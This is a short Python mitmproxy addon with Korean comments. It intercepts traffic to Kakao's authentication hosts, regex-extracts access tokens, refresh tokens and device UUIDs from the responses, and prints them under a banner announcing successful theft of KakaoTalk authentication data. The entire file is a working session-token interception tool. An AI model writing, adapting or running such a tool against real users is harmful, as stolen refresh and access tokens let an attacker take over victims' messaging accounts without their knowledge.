import re
from mitmproxy import http

class KakaoExtractor:
    def __init__(self):
        # 분석 타겟 호스트
        self.auth_host = "auth.kakao.com"
        self.api_host = "kauth.kakao.com"

    def handle_request(self, flow: http.HTTPFlow):
        # 요청 단계에서 필요한 정보가 있다면 여기서 추출 (예: URL 파라미터)
        if self.auth_host in flow.request.pretty_host:
            # print(f"[*] Auth Request 탐지: {flow.request.path}")
            pass

    def handle_response(self, flow: http.HTTPFlow):
        # 응답 단계에서 access_token 및 device_uuid 추출
        if self.auth_host in flow.request.pretty_host or self.api_host in flow.request.pretty_host:
            content = flow.response.get_text()
            
            # 정규표현식을 이용한 데이터 파싱
            token = re.search(r'"access_token":"(.*?)"', content)
            uuid = re.search(r'"device_uuid":"(.*?)"', content)
            refresh = re.search(r'"refresh_token":"(.*?)"', content)

            if token or uuid:
                print("\n" + "="*50)
                print("[!] 카카오톡 인증 데이터 탈취 성공")
                if token: print(f" > Access Token: {token.group(1)}")
                if refresh: print(f" > Refresh Token: {refresh.group(1)}")
                if uuid:  print(f" > Device UUID:  {uuid.group(1)}")
                print("="*50 + "\n")
